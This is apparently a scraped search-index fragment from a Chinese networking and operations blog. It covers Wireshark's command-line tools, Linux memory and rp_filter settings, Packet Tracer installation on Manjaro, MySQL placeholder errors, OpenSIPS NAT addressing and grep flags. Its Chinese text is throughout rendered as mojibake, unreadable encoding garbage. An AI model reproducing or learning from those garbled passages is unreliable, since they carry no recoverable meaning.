è¿™ä¸ªåº”è¯¥æ˜¯å¯¹sshè¿›è¡ŒæŠ“åŒ…çš„ Wireshark - sshdump v1.0.0 Usage: sshdump \u0026ndash;extcap-interfaces sshdump \u0026ndash;extcap-interface=sshdump \u0026ndash;extcap-dlts sshdump \u0026ndash;extcap-interface=sshdump \u0026ndash;extcap-config sshdump \u0026ndash;extcap-interface=sshdump \u0026ndash;remote-host myhost \u0026ndash;remote-port 22222 \u0026ndash;remote-username myuser \u0026ndash;remote-interface eth2 \u0026ndash;remote-capture-command \u0026rsquo;tcpdump -U -i eth0 -w -\u0026rsquo; \u0026ndash;fifo=FILENAME \u0026ndash;capture\n6. idl2wrs 7. mergecap åˆå¹¶å¤šä¸ªæŠ“åŒ…æ–‡ä»¶ mergecap -w output.pcap input1.pcap input2.pcap input3.pcap\n8. mmdbresolve 9. randpkt 10. rawshark 11. reordercap Reordercap (Wireshark) 3.6.1 (v3.6.1-0-ga0a473c7c1ba) Reorder timestamps of input file frames into output file. See https://www.wireshark.org for more information. Usage: reordercap [options] Options: -n don\u0026rsquo;t write to output file if the input file is ordered. -h display this help and exit. -v print version information and exit.\n12. sharkd Usage: sharkd [\u0026lt;classic_options\u0026gt;|\u0026lt;gold_options\u0026gt;] Classic (classic_options): [-|] examples:\nunix:/tmp/sharkd.sock - listen on unix file /tmp/sharkd.sock Gold (gold_options): -a , \u0026ndash;api listen on this socket -h, \u0026ndash;help show this help information -v, \u0026ndash;version show version information -C , \u0026ndash;config-profile start with specified configuration profile Examples: sharkd -C myprofile sharkd -a tcp:127.0.0.1:4446 -C myprofile See the sharkd page of the Wireshark wiki for full details. 13. text2pcap Text2pcap (Wireshark) 3.6.1 (v3.6.1-0-ga0a473c7c1ba) Generate a capture file from an ASCII hexdump of packets. See https://www.wireshark.org for more information. Usage: text2pcap [options] where specifies input filename (use - for standard input) specifies output filename (use - for standard output)\n14. tshark å‘½ä»¤è¡Œç‰ˆæœ¬çš„wireshark, ç”¨çš„æœ€å¤šçš„ TShark (Wireshark) 3.6.1 (v3.6.1-0-ga0a473c7c1ba) Dump and analyze network traffic. See https://www.wireshark.org for more information.\n15. udpdump Wireshark - udpdump v0.1.0 Usage: udpdump \u0026ndash;extcap-interfaces udpdump \u0026ndash;extcap-interface=udpdump \u0026ndash;extcap-dlts udpdump \u0026ndash;extcap-interface=udpdump \u0026ndash;extcap-config udpdump \u0026ndash;extcap-interface=udpdump \u0026ndash;port 5555 \u0026ndash;fifo myfifo \u0026ndash;capture Options: \u0026ndash;extcap-interfaces: list the extcap Interfaces \u0026ndash;extcap-dlts: list the DLTs \u0026ndash;extcap-interface : specify the extcap interface \u0026ndash;extcap-config: list the additional configuration for an interface \u0026ndash;capture: run the capture \u0026ndash;extcap-capture-filter : the capture filter \u0026ndash;fifo : dump data to file or fifo \u0026ndash;extcap-version: print tool version \u0026ndash;debug: print additional messages \u0026ndash;debug-file: print debug messages to file \u0026ndash;help: print this help \u0026ndash;version: print the version \u0026ndash;port : the port to listens on. Default: 5555\n16. capinfos æ‰“å°å‡ºåŒ…çš„å„ç§ä¿¡æ¯ Capinfos (Wireshark) 3.6.1 (v3.6.1-0-ga0a473c7c1ba) Print various information (infos) about capture files. See https://www.wireshark.org for more information. Usage: capinfos [options] \u0026hellip; General infos: -t display the capture file type -E display the capture file encapsulation -I display the capture file interface information -F display additional capture file information -H display the SHA256, RIPEMD160, and SHA1 hashes of the file -k display the capture comment\n17. captype Captype (Wireshark) 3.6.1 (v3.6.1-0-ga0a473c7c1ba) Print the file types of capture files.\n18. dftest âœ ~ dftest \u0026ndash;help\nFilter: \u0026ndash;help\n19. dumpcap See https://www.wireshark.org for more information.\n","permalink":"https://wdd.js.org/network/wireshark-extra-cli/","summary":"å¤§å¤šæ•°æ—¶å€™æˆ‘ä»¬éƒ½æ˜¯å›¾å½¢ç•Œé¢çš„æ–¹å¼ä½¿ç”¨wireshak, å…¶å®ä¸€èˆ¬åªè¦ä½ å®‰è£…äº†wiresharkï¼ŒåŒæ—¶ä¹Ÿé™„å¸¦å®‰è£…äº†ä¸€äº›å‘½ä»¤è¡Œå·¥å…·ã€‚ è¿™äº›å·¥å…·ä¹Ÿå¯ä»¥æå¤§çš„æé«˜ç”Ÿäº§æ•ˆç‡ã€‚ æœ¬æ–‡åªæ˜¯å¯¹å·¥å…·çš„åŠŸèƒ½ç®€ä»‹ï¼Œå¯ä»¥ä½¿ç”¨å‘½ä»¤ -h, æŸ¥çœ‹å‘½ä»¤çš„å…·ä½“ä½¿ç”¨æ–‡æ¡£ã€‚\n1. editcap ç¼–è¾‘æŠ“åŒ…æ–‡ä»¶ Editcap (Wireshark) 3.6.1 (v3.6.1-0-ga0a473c7c1ba) Edit and/or translate the format of capture files. ä¸¾ä¾‹: æŒ‰ç…§æ—¶é—´èŒƒå›´ä»input.pcapæ–‡ä»¶ä¸­æ‹¿å‡ºæŒ‡å®šæ—¶é—´èŒƒå›´çš„åŒ…\neditcap -A \u0026#39;2014-12-10 10:11:01\u0026#39; -B \u0026#39;2014-12-10 10:21:01\u0026#39; input.pcap output.pcap 2. androiddump è¿™ä¸ªå‘½ä»¤ä¼¼ä¹å¯ä»¥ç”¨æ¥å¯¹å®‰å“ç³»ç»Ÿè¿›è¡ŒæŠ“åŒ…ï¼Œæ²¡ç©è¿‡å®‰å“ï¼Œä¸å†å¤šè¯´ã€‚\nWireshark - androiddump v1.1.0 Usage: androiddump --extcap-interfaces [--adb-server-ip=\u0026lt;arg\u0026gt;] [--adb-server-tcp-port=\u0026lt;arg\u0026gt;] androiddump --extcap-interface=INTERFACE --extcap-dlts androiddump --extcap-interface=INTERFACE --extcap-config androiddump --extcap-interface=INTERFACE --fifo=PATH_FILENAME --capture 3. ciscodump ä¼¼ä¹æ˜¯å¯¹æ€ç§‘çš„ç½‘ç»œè¿›è¡ŒæŠ“åŒ…çš„ï¼Œæ²¡ç”¨è¿‡ Wireshark - ciscodump v1.0.0 Usage: ciscodump \u0026ndash;extcap-interfaces ciscodump \u0026ndash;extcap-interface=ciscodump \u0026ndash;extcap-dlts ciscodump \u0026ndash;extcap-interface=ciscodump \u0026ndash;extcap-config ciscodump \u0026ndash;extcap-interface=ciscodump \u0026ndash;remote-host myhost \u0026ndash;remote-port 22222 \u0026ndash;remote-username myuser \u0026ndash;remote-interface gigabit0/0 \u0026ndash;fifo=FILENAME \u0026ndash;capture","title":"Wireshark é™„å¸¦çš„19å‘½ä»¤è¡Œç¨‹åº"},{"content":"ç¯å¢ƒ kernal Linux 5.15.48-1-MANJARO #1 SMP PREEMPT Thu Jun 16 12:33:56 UTC 2022 x86_64 GNU/Linux docker 20.10.16 åˆå§‹å†…å­˜ total used free shared buff/cache available å†…å­˜ï¼š 30Gi 1.9Gi 19Gi 2.0Mi 9.6Gi 28Gi äº¤æ¢ï¼š 0B 0B 0B åˆå§‹é…ç½® sysctl -n vm.min_free_kbytes 67584 sysctl -n vm.vfs_cache_pressure 200 vfs_cache_pressureçš„å¯¹å†…å­˜çš„å½±å“ vfs_cache_pressureè®¾ç½®ä¸º200ï¼Œ ç†è®ºç³»ç»Ÿå€¾å‘äºå›æ”¶å†…å­˜\n","permalink":"https://wdd.js.org/posts/2022/06/eafeid/","summary":"ç¯å¢ƒ kernal Linux 5.15.48-1-MANJARO #1 SMP PREEMPT Thu Jun 16 12:33:56 UTC 2022 x86_64 GNU/Linux docker 20.10.16 åˆå§‹å†…å­˜ total used free shared buff/cache available å†…å­˜ï¼š 30Gi 1.9Gi 19Gi 2.0Mi 9.6Gi 28Gi äº¤æ¢ï¼š 0B 0B 0B åˆå§‹é…ç½® sysctl -n vm.min_free_kbytes 67584 sysctl -n vm.vfs_cache_pressure 200 vfs_cache_pressureçš„å¯¹å†…å­˜çš„å½±å“ vfs_cache_pressureè®¾ç½®ä¸º200ï¼Œ ç†è®ºç³»ç»Ÿå€¾å‘äºå›æ”¶å†…å­˜","title":"vfs_cache_pressureå’Œmin_free_kbyteså¯¹cacheçš„å½±å“"},{"content":"# å°†ä¼šä¸‹è½½packettraceråˆ°å½“å‰ç›®å½•ä¸‹ yay -G packettracer cd packettracer # Download PacketTracer_731_amd64.deb to this folder makepkg sudo pacman -U packettracer-7.3.1-2-x86_64.pkg.tar.xz æ³¨æ„ï¼Œå¦‚æœä¸‹è½½çš„packetraaceråŒ…ä¸æ˜¯PacketTracer_731_amd64.debï¼Œ åˆ™éœ€è¦ä¿®æ”¹PKGBUILDæ–‡ä»¶ä¸­çš„, souceå¯¹åº”çš„æ–‡ä»¶åã€‚ ä¾‹å¦‚æˆ‘ä¸‹è½½çš„packettraceræ˜¯Cisco_Packet_Tracer_811_Ubuntu_64bit_cf200f5851.deb\nsource=(\u0026#39;local://Cisco_Packet_Tracer_811_Ubuntu_64bit_cf200f5851.deb\u0026#39; \u0026#39;packettracer.sh\u0026#39;) æ³¨æ„ï¼šæœ€æ–°ç‰ˆçš„packertraceræ‰“å¼€åï¼Œå¿…é¡»ç™»é™†è´¦å·æ‰èƒ½ä½¿ç”¨ï¼Œæœ‰ç‚¹å‘ã€‚ èŠ±è´¹ç‚¹æ—¶é—´æ³¨å†Œäº†è´¦å·åï¼Œæ‰èƒ½ç”¨ã€‚\nå‚è€ƒ https://forum.manjaro.org/t/how-to-get-cisco-packet-tracer-on-manjaro/25506/5 ","permalink":"https://wdd.js.org/posts/2022/06/manjaro-packettracer/","summary":"# å°†ä¼šä¸‹è½½packettraceråˆ°å½“å‰ç›®å½•ä¸‹ yay -G packettracer cd packettracer # Download PacketTracer_731_amd64.deb to this folder makepkg sudo pacman -U packettracer-7.3.1-2-x86_64.pkg.tar.xz æ³¨æ„ï¼Œå¦‚æœä¸‹è½½çš„packetraaceråŒ…ä¸æ˜¯PacketTracer_731_amd64.debï¼Œ åˆ™éœ€è¦ä¿®æ”¹PKGBUILDæ–‡ä»¶ä¸­çš„, souceå¯¹åº”çš„æ–‡ä»¶åã€‚ ä¾‹å¦‚æˆ‘ä¸‹è½½çš„packettraceræ˜¯Cisco_Packet_Tracer_811_Ubuntu_64bit_cf200f5851.deb\nsource=(\u0026#39;local://Cisco_Packet_Tracer_811_Ubuntu_64bit_cf200f5851.deb\u0026#39; \u0026#39;packettracer.sh\u0026#39;) æ³¨æ„ï¼šæœ€æ–°ç‰ˆçš„packertraceræ‰“å¼€åï¼Œå¿…é¡»ç™»é™†è´¦å·æ‰èƒ½ä½¿ç”¨ï¼Œæœ‰ç‚¹å‘ã€‚ èŠ±è´¹ç‚¹æ—¶é—´æ³¨å†Œäº†è´¦å·åï¼Œæ‰èƒ½ç”¨ã€‚\nå‚è€ƒ https://forum.manjaro.org/t/how-to-get-cisco-packet-tracer-on-manjaro/25506/5 ","title":"manjaro å®‰è£… packettracer"},{"content":"é—®é¢˜ç°è±¡ ä¸»æœºä¸Šæœ‰ä¸¤ä¸ªç½‘å¡ens192å’Œens224ã€‚ens129ç½‘å¡æ˜¯å¯¹å†…ç½‘ç»œçš„ç½‘å¡ï¼Œens224æ˜¯å¯¹ç½‘ç½‘ç»œçš„ç½‘å¡ã€‚\nSIPä¿¡ä»¤é˜¶æ®µéƒ½æ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯å‘ç°ï¼Œå¯¹äºæ¥è‡ªnode3çš„RTPæµï¼Œ å¹¶æ²¡æœ‰ä»ens192ç½‘å¡è½¬å‘ç»™node1ä¸Šã€‚\nsequenceDiagram title network autonumber node1-\u003e\u003eens192: INVITE ens224-\u003e\u003enode2: INVITE node2-\u003e\u003eens224: 200 ok ens192-\u003e\u003enode1: 200 ok node1-\u003e\u003eens192: ACK ens224-\u003e\u003enode2: ACK node1--\u003e\u003eens192: RTP out ens224--\u003e\u003enode3: RTP out node3--\u003e\u003eens224: RTP in æŠ“åŒ…ç¨‹åºæŠ“åˆ°äº†node3å‘é€åˆ°ens224ä¸Šçš„åŒ…ï¼Œä½†æ˜¯æ’æŸ¥åº”ç”¨æœåŠ¡å™¨çš„æ—¥å¿—å‘ç°ï¼Œä¼¼ä¹åº”ç”¨æœåŠ¡å™¨æ ¹æœ¬æ²¡æœ‰æ”¶åˆ°node3ä¸Šè¿‡æ¥çš„åŒ…, æ‰€ä»¥ä¹Ÿå°±æ— æ³•è½¬å‘ã€‚\nå› è€Œæ€€ç–‘æ˜¯ä¸æ˜¯åœ¨å†…æ ¸ä¸Šè¢«æ‹¦æˆªäº†ã€‚ åæ¥é€šè¿‡å°†rp_filterè®¾ç½®ä¸º0, ç„¶åè¯­éŸ³æµçš„è½¬å‘å°±æ­£å¸¸äº†ã€‚\näº‹åå¤ç›˜ node3çš„è¿™ä¸ªIPç›´æ¥å¾€åº”ç”¨æœåŠ¡å™¨ä¸Šå‘åŒ…ï¼Œå¯èƒ½ä¼šè¢«æ‹¦æˆªã€‚å› ä¸ºåœ¨ä¿¡ä»¤å»ºç«‹çš„é˜¶æ®µï¼Œåº”ç”¨æœåŠ¡å™¨å¹¶æ²¡æœ‰ä¸»åŠ¨å‘\nåœ¨kernelæ–‡æ¡£ä¸Š rp_filter - INTEGER 0 - No source validation. 1 - Strict mode as defined in RFC3704 Strict Reverse Path Each incoming packet is tested against the FIB and if the interface is not the best reverse path the packet check will fail. By default failed packets are discarded. 2 - Loose mode as defined in RFC3704 Loose Reverse Path Each incoming packet\u0026#39;s source address is also tested against the FIB and if the source address is not reachable via any interface the packet check will fail. Current recommended practice in RFC3704 is to enable strict mode to prevent IP spoofing from DDos attacks. If using asymmetric routing or other complicated routing, then loose mode is recommended. The max value from conf/{all,interface}/rp_filter is used when doing source validation on the {interface}. Default value is 0. Note that some distributions enable it in startup scripts. å‚è€ƒ https://www.jianshu.com/p/717e6cd9d2bb https://www.jianshu.com/p/16d5c130670b https://www.kernel.org/doc/Documentation/networking/ip-sysctl.txt ","permalink":"https://wdd.js.org/network/rp_filter/","summary":"é—®é¢˜ç°è±¡ ä¸»æœºä¸Šæœ‰ä¸¤ä¸ªç½‘å¡ens192å’Œens224ã€‚ens129ç½‘å¡æ˜¯å¯¹å†…ç½‘ç»œçš„ç½‘å¡ï¼Œens224æ˜¯å¯¹ç½‘ç½‘ç»œçš„ç½‘å¡ã€‚\nSIPä¿¡ä»¤é˜¶æ®µéƒ½æ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯å‘ç°ï¼Œå¯¹äºæ¥è‡ªnode3çš„RTPæµï¼Œ å¹¶æ²¡æœ‰ä»ens192ç½‘å¡è½¬å‘ç»™node1ä¸Šã€‚\nsequenceDiagram title network autonumber node1-\u003e\u003eens192: INVITE ens224-\u003e\u003enode2: INVITE node2-\u003e\u003eens224: 200 ok ens192-\u003e\u003enode1: 200 ok node1-\u003e\u003eens192: ACK ens224-\u003e\u003enode2: ACK node1--\u003e\u003eens192: RTP out ens224--\u003e\u003enode3: RTP out node3--\u003e\u003eens224: RTP in æŠ“åŒ…ç¨‹åºæŠ“åˆ°äº†node3å‘é€åˆ°ens224ä¸Šçš„åŒ…ï¼Œä½†æ˜¯æ’æŸ¥åº”ç”¨æœåŠ¡å™¨çš„æ—¥å¿—å‘ç°ï¼Œä¼¼ä¹åº”ç”¨æœåŠ¡å™¨æ ¹æœ¬æ²¡æœ‰æ”¶åˆ°node3ä¸Šè¿‡æ¥çš„åŒ…, æ‰€ä»¥ä¹Ÿå°±æ— æ³•è½¬å‘ã€‚\nå› è€Œæ€€ç–‘æ˜¯ä¸æ˜¯åœ¨å†…æ ¸ä¸Šè¢«æ‹¦æˆªäº†ã€‚ åæ¥é€šè¿‡å°†rp_filterè®¾ç½®ä¸º0, ç„¶åè¯­éŸ³æµçš„è½¬å‘å°±æ­£å¸¸äº†ã€‚\näº‹åå¤ç›˜ node3çš„è¿™ä¸ªIPç›´æ¥å¾€åº”ç”¨æœåŠ¡å™¨ä¸Šå‘åŒ…ï¼Œå¯èƒ½ä¼šè¢«æ‹¦æˆªã€‚å› ä¸ºåœ¨ä¿¡ä»¤å»ºç«‹çš„é˜¶æ®µï¼Œåº”ç”¨æœåŠ¡å™¨å¹¶æ²¡æœ‰ä¸»åŠ¨å‘\nåœ¨kernelæ–‡æ¡£ä¸Š rp_filter - INTEGER 0 - No source validation. 1 - Strict mode as defined in RFC3704 Strict Reverse Path Each incoming packet is tested against the FIB and if the interface is not the best reverse path the packet check will fail.","title":"Linuxå†…æ ¸å‚æ•°rp_filter"},{"content":" Error EXTRA *mysql.MySQLError=Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026lsquo;? ( ç„¶è€Œæˆ‘ä»”ç»†çœ‹äº†çœ‹sqlè¯­å¥ï¼Œæ²¡æœ‰çœ‹å‡ºæ¥ç©¶ç«Ÿå“ªé‡Œæœ‰sqlæŠ¥é”™ã€‚\nç„¶è€Œå½“æˆ‘æŠŠä½œä¸ºplaceholderçš„é—®å·å»æ‰ï¼Œç›´æ¥ç”¨è¡¨çš„åå­—ï¼Œsqlæ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œçš„ã€‚æˆ‘æ„è¯†åˆ°è¿™ä¸ªå¯èƒ½æ˜¯å’Œplaceholderæœ‰å…³ã€‚\næœç´¢äº†ä¸€ä¸‹ï¼Œçœ‹åˆ°ä¸€ä¸ªé“¾æ¥ https://github.com/go-sql-driver/mysql/issues/848\nPlaceholder can\u0026rsquo;t be used for table name or column name. It\u0026rsquo;s MySQL spec. Not bug of this project.\nå¤§æ„æ˜¯è¯´ï¼Œplaceholderæ˜¯ä¸èƒ½ä½œä¸ºè¡¨åæˆ–è€…åˆ—åçš„ã€‚\nåœ¨mysqlå…³äºpreparedæ–‡æ¡£ä»‹ç»ä¸­ï¼Œåœ¨å…è®¸ä½¿ç”¨preparedçš„è¯­å¥é‡Œï¼Œæ²¡æœ‰çœ‹åˆ°create tableå¯ä»¥ç”¨placeholderhttps://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html\npreparedè¯­å¥çš„ä¼˜ç‚¹æœ‰ä»¥ä¸‹å‡ ä¸ª\nä¼˜åŒ–æŸ¥è¯¢é€Ÿåº¦ é˜²æ­¢sqlæ³¨å…¥ ä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›é™åˆ¶\nä¸æ˜¯æ‰€æœ‰è¯­å¥éƒ½èƒ½ç”¨preparedè¯­å¥ã€‚å¸¸è§çš„ç”¨æ³•åº”è¯¥æ˜¯ä½œä¸ºselect whereä¹‹åçš„æ¡ä»¶ï¼Œæˆ–è€…INSERTè¯­å¥ä¹‹åçš„å€¼ ä¸æ”¯æŒä¸€ä¸ªsqlä¸­å¤šæ¡æŸ¥è¯¢è¯­å¥çš„å½¢å¼ ","permalink":"https://wdd.js.org/posts/2022/06/vvdqw6/","summary":" Error EXTRA *mysql.MySQLError=Error 1064: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026lsquo;? ( ç„¶è€Œæˆ‘ä»”ç»†çœ‹äº†çœ‹sqlè¯­å¥ï¼Œæ²¡æœ‰çœ‹å‡ºæ¥ç©¶ç«Ÿå“ªé‡Œæœ‰sqlæŠ¥é”™ã€‚\nç„¶è€Œå½“æˆ‘æŠŠä½œä¸ºplaceholderçš„é—®å·å»æ‰ï¼Œç›´æ¥ç”¨è¡¨çš„åå­—ï¼Œsqlæ˜¯å¯ä»¥ç›´æ¥æ‰§è¡Œçš„ã€‚æˆ‘æ„è¯†åˆ°è¿™ä¸ªå¯èƒ½æ˜¯å’Œplaceholderæœ‰å…³ã€‚\næœç´¢äº†ä¸€ä¸‹ï¼Œçœ‹åˆ°ä¸€ä¸ªé“¾æ¥ https://github.com/go-sql-driver/mysql/issues/848\nPlaceholder can\u0026rsquo;t be used for table name or column name. It\u0026rsquo;s MySQL spec. Not bug of this project.\nå¤§æ„æ˜¯è¯´ï¼Œplaceholderæ˜¯ä¸èƒ½ä½œä¸ºè¡¨åæˆ–è€…åˆ—åçš„ã€‚\nåœ¨mysqlå…³äºpreparedæ–‡æ¡£ä»‹ç»ä¸­ï¼Œåœ¨å…è®¸ä½¿ç”¨preparedçš„è¯­å¥é‡Œï¼Œæ²¡æœ‰çœ‹åˆ°create tableå¯ä»¥ç”¨placeholderhttps://dev.mysql.com/doc/refman/8.0/en/sql-prepared-statements.html\npreparedè¯­å¥çš„ä¼˜ç‚¹æœ‰ä»¥ä¸‹å‡ ä¸ª\nä¼˜åŒ–æŸ¥è¯¢é€Ÿåº¦ é˜²æ­¢sqlæ³¨å…¥ ä½†æ˜¯ä¹Ÿæœ‰ä¸€äº›é™åˆ¶\nä¸æ˜¯æ‰€æœ‰è¯­å¥éƒ½èƒ½ç”¨preparedè¯­å¥ã€‚å¸¸è§çš„ç”¨æ³•åº”è¯¥æ˜¯ä½œä¸ºselect whereä¹‹åçš„æ¡ä»¶ï¼Œæˆ–è€…INSERTè¯­å¥ä¹‹åçš„å€¼ ä¸æ”¯æŒä¸€ä¸ªsqlä¸­å¤šæ¡æŸ¥è¯¢è¯­å¥çš„å½¢å¼ ","title":"mysql placeholderçš„é”™è¯¯ä½¿ç”¨æ–¹å¼"},{"content":" OPS \u0026lt;\u0026lt;\u0026lt;----------------------------- ingress å†…ç½‘ | å…¬ç½‘ ï½œ | 192.168.2.11 | 1.2.3.4 INNER_IP | OUTER_IP | | ------------------------------\u0026gt;\u0026gt;\u0026gt; egress å¸¸è§å…±æœ‰äº‘çš„æä¾›çš„äº‘æœåŠ¡å™¨ï¼Œä¸€èˆ¬éƒ½æœ‰ä¸€ä¸ªå†…ç½‘åœ°å€å¦‚192.16.2.11å’Œä¸€ä¸ªå…¬ç½‘åœ°å€å¦‚1.2.3.4ã€‚ å†…ç½‘åœ°å€æ˜¯é…ç½®åœ¨ç½‘å¡ä¸Šçš„ï¼›å…¬ç½‘åœ°å€åˆ™åªæ˜¯ä¸€ä¸ªæ˜ å°„ï¼Œå¹¶æœªåœ¨ç½‘å¡ä¸Šé…ç½®ã€‚\næˆ‘ä»¬ç§°ä»å…¬ç½‘åˆ°å†…ç½‘çš„æ–¹å‘ä¸ºingressï¼Œä»å†…ç½‘åˆ°å…¬ç½‘çš„æ–¹å‘ä¸ºegressã€‚\nå¯¹äºå†…ç½‘æ¥è¯´OpenSIPSçš„å¹¿æ’­åœ°å€åº”è¯¥æ˜¯INNER_IP, æ‰€ä»¥å¯¹ingressæ–¹å‘çš„SIPè¯·æ±‚ï¼ŒViaåº”è¯¥æ˜¯INNER_IPã€‚å¯¹äºå…¬ç½‘æ¥è¯´OpenSIPSçš„å¹¿æ’­åœ°å€åº”è¯¥æ˜¯OUT_IP, éšæ„å¯¹äºegressæ–¹å‘çš„SIPè¯·æ±‚ï¼ŒViaåº”è¯¥æ˜¯OUTER_IPã€‚\næˆ‘ä»¬æ¨¡æ‹Ÿä¸€ä¸‹ï¼Œå‡å¦‚è®¾ç½®äº†é”™è¯¯çš„Viaçš„åœ°å€ä¼šæ€æ ·å‘¢ï¼Ÿ\nä¾‹å¦‚ä»å…¬ç½‘åˆ°å†…ç½‘çš„ä¸€ä¸ªINVITE, å¦‚æœViaå¤´åŠ ä¸Šçš„æ˜¯OUTER_IPï¼Œ é‚£ä¹ˆè¿™ä¸ªè¯·æ±‚çš„å“åº”ä¹Ÿä¼šè¢«é€åˆ°OPSçš„å…¬ç½‘åœ°å€ã€‚ä½†æ˜¯ç”±äºç½‘ç»œç­–ç•¥å’Œé˜²ç«å¢™ç­‰åŸå› ï¼Œè¿™ä¸ªæ¥è‡ªå†…ç½‘çš„å“åº”å¾ˆå¯èƒ½æ— æ³•è¢«é€åˆ°OPSçš„å…¬ç½‘åœ°å€ã€‚\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨listençš„aså‚æ•°æ¥è®¾ç½®å¯¹å¤–çš„å¹¿å‘Šåœ°å€ã€‚\nlisten = udp:192.168.2.11:5060 as 1.2.3.4:5060 è¿™æ ·çš„æƒ…å†µä¸‹ï¼Œä»å†…ç½‘å‘é€åˆ°å…¬ç½‘è¯·æ±‚ï¼Œæºå¸¦çš„Viaå°±è¢«è¢«è®¾ç½®æˆ1.2.3.4ã€‚\nä½†æ˜¯ä¹Ÿä¸æ˜¯asè®¾ç½®çš„å¹¿å‘Šåœ°å€ä¸€å®šæ­£ç¡®ã€‚è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ç”¨OpenSIPSæä¾›çš„æ ¸å¿ƒå‡½æ•°set_advertised_addressæˆ–è€…set_advertised_port()æ¥åœ¨è„šæœ¬é‡Œè‡ªå®šä¹‰å¯¹å¤–åœ°å€ã€‚\nä¾‹å¦‚ï¼š\nif (è¯·æ±‚æ¥è‡ªå¤–ç½‘) { set_advertised_address(\u0026#34;192.168.2.11\u0026#34;); } else { set_advertised_address(\u0026#34;1.2.3.4\u0026#34;); } ","permalink":"https://wdd.js.org/opensips/ch9/nat-single-interface/","summary":" OPS \u0026lt;\u0026lt;\u0026lt;----------------------------- ingress å†…ç½‘ | å…¬ç½‘ ï½œ | 192.168.2.11 | 1.2.3.4 INNER_IP | OUTER_IP | | ------------------------------\u0026gt;\u0026gt;\u0026gt; egress å¸¸è§å…±æœ‰äº‘çš„æä¾›çš„äº‘æœåŠ¡å™¨ï¼Œä¸€èˆ¬éƒ½æœ‰ä¸€ä¸ªå†…ç½‘åœ°å€å¦‚192.16.2.11å’Œä¸€ä¸ªå…¬ç½‘åœ°å€å¦‚1.2.3.4ã€‚ å†…ç½‘åœ°å€æ˜¯é…ç½®åœ¨ç½‘å¡ä¸Šçš„ï¼›å…¬ç½‘åœ°å€åˆ™åªæ˜¯ä¸€ä¸ªæ˜ å°„ï¼Œå¹¶æœªåœ¨ç½‘å¡ä¸Šé…ç½®ã€‚\næˆ‘ä»¬ç§°ä»å…¬ç½‘åˆ°å†…ç½‘çš„æ–¹å‘ä¸ºingressï¼Œä»å†…ç½‘åˆ°å…¬ç½‘çš„æ–¹å‘ä¸ºegressã€‚\nå¯¹äºå†…ç½‘æ¥è¯´OpenSIPSçš„å¹¿æ’­åœ°å€åº”è¯¥æ˜¯INNER_IP, æ‰€ä»¥å¯¹ingressæ–¹å‘çš„SIPè¯·æ±‚ï¼ŒViaåº”è¯¥æ˜¯INNER_IPã€‚å¯¹äºå…¬ç½‘æ¥è¯´OpenSIPSçš„å¹¿æ’­åœ°å€åº”è¯¥æ˜¯OUT_IP, éšæ„å¯¹äºegressæ–¹å‘çš„SIPè¯·æ±‚ï¼ŒViaåº”è¯¥æ˜¯OUTER_IPã€‚\næˆ‘ä»¬æ¨¡æ‹Ÿä¸€ä¸‹ï¼Œå‡å¦‚è®¾ç½®äº†é”™è¯¯çš„Viaçš„åœ°å€ä¼šæ€æ ·å‘¢ï¼Ÿ\nä¾‹å¦‚ä»å…¬ç½‘åˆ°å†…ç½‘çš„ä¸€ä¸ªINVITE, å¦‚æœViaå¤´åŠ ä¸Šçš„æ˜¯OUTER_IPï¼Œ é‚£ä¹ˆè¿™ä¸ªè¯·æ±‚çš„å“åº”ä¹Ÿä¼šè¢«é€åˆ°OPSçš„å…¬ç½‘åœ°å€ã€‚ä½†æ˜¯ç”±äºç½‘ç»œç­–ç•¥å’Œé˜²ç«å¢™ç­‰åŸå› ï¼Œè¿™ä¸ªæ¥è‡ªå†…ç½‘çš„å“åº”å¾ˆå¯èƒ½æ— æ³•è¢«é€åˆ°OPSçš„å…¬ç½‘åœ°å€ã€‚\nä¸€èˆ¬æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨listençš„aså‚æ•°æ¥è®¾ç½®å¯¹å¤–çš„å¹¿å‘Šåœ°å€ã€‚\nlisten = udp:192.168.2.11:5060 as 1.2.3.4:5060 è¿™æ ·çš„æƒ…å†µä¸‹ï¼Œä»å†…ç½‘å‘é€åˆ°å…¬ç½‘è¯·æ±‚ï¼Œæºå¸¦çš„Viaå°±è¢«è¢«è®¾ç½®æˆ1.2.3.4ã€‚\nä½†æ˜¯ä¹Ÿä¸æ˜¯asè®¾ç½®çš„å¹¿å‘Šåœ°å€ä¸€å®šæ­£ç¡®ã€‚è¿™æ—¶å€™æˆ‘ä»¬å°±å¯ä»¥ç”¨OpenSIPSæä¾›çš„æ ¸å¿ƒå‡½æ•°set_advertised_addressæˆ–è€…set_advertised_port()æ¥åœ¨è„šæœ¬é‡Œè‡ªå®šä¹‰å¯¹å¤–åœ°å€ã€‚\nä¾‹å¦‚ï¼š\nif (è¯·æ±‚æ¥è‡ªå¤–ç½‘) { set_advertised_address(\u0026#34;192.168.2.11\u0026#34;); } else { set_advertised_address(\u0026#34;1.2.3.4\u0026#34;); } ","title":"NATåœºæ™¯ä¸‹çš„ä¿¡ä»¤å¤„ç† - å•ç½‘å¡"},{"content":"1. grep å¸¸ç”¨å‚æ•° å‚è€ƒï¼š GNU Grep 3.0\n--color:é«˜äº®æ˜¾ç¤ºåŒ¹é…åˆ°çš„å­—ç¬¦ä¸² -vï¼šæ˜¾ç¤ºä¸èƒ½è¢«patternåŒ¹é…åˆ°çš„ -iï¼šå¿½ç•¥å­—ç¬¦å¤§å°å†™ -oï¼šä»…æ˜¾ç¤ºåŒ¹é…åˆ°çš„å­—ç¬¦ä¸² -qï¼šé™é»˜æ¨¡å¼ï¼Œä¸è¾“å‡ºä»»ä½•ä¿¡æ¯ -A#ï¼šafterï¼ŒåŒ¹é…åˆ°çš„å#è¡Œ -B#ï¼šbeforeï¼ŒåŒ¹é…åˆ°çš„å‰#è¡Œ -C#ï¼šcontextï¼ŒåŒ¹é…åˆ°çš„å‰åå„#è¡Œ 